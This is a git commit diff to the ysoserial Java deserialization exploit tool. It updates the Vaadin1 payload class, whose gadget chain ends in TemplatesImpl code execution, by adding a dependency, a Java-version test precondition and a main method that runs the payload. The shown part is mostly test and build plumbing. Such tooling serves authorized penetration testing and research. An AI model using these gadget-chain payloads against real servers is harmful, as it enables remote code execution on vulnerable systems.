e0b15a3961ee368ef707ed97be6ad2bce72a408d
supersache <kai@ktechnologies.de>
2018-09-20 13:00:21 +0200

    additional dependency added, precondition badattrvalexcobj

--- src/main/java/ysoserial/payloads/Vaadin1.java
+++ src/main/java/ysoserial/payloads/Vaadin1.java
@@ -7,10 +7,14 @@ import com.vaadin.data.util.PropertysetItem;
 
 import ysoserial.payloads.annotation.Authors;
 import ysoserial.payloads.annotation.Dependencies;
+import ysoserial.payloads.annotation.PayloadTest;
 import ysoserial.payloads.util.Gadgets;
+import ysoserial.payloads.util.JavaVersion;
+import ysoserial.payloads.util.PayloadRunner;
 import ysoserial.payloads.util.Reflections;
 
-@Dependencies ( { "com.vaadin:vaadin-server:7.7.14" })
+@Dependencies ( { "com.vaadin:vaadin-server:7.7.14", "com.vaadin:vaadin-shared:7.7.14" })
+@PayloadTest ( precondition = "isApplicableJavaVersion")
 @Authors({ Authors.KULLRICH })
 public class Vaadin1 implements ObjectPayload<Object>
 {
@@ -50,9 +54,8 @@ public class Vaadin1 implements ObjectPayload<Object>
 //                |   v                                            |
 //                |  TemplatesImpl.getOutputProperties()           |
 //                |                                                |
-//                |                                                |
-//                |                                                |
 //                +------------------------------------------------+
+    
     @Override
     public Object getObject (String command) throws Exception
     {
@@ -66,6 +69,14 @@ public class Vaadin1 implements ObjectPayload<Object>
         Reflections.setFieldValue (b, "val", pItem);
         
         return b;
+    }
+
+    public static boolean isApplicableJavaVersion() {
+        return JavaVersion.isBadAttrValExcReadObj();
+    }
+
+    public static void main(final String[] args) throws Exception {
+        PayloadRunner.run(Vaadin1.class, args);
     }
 
 }
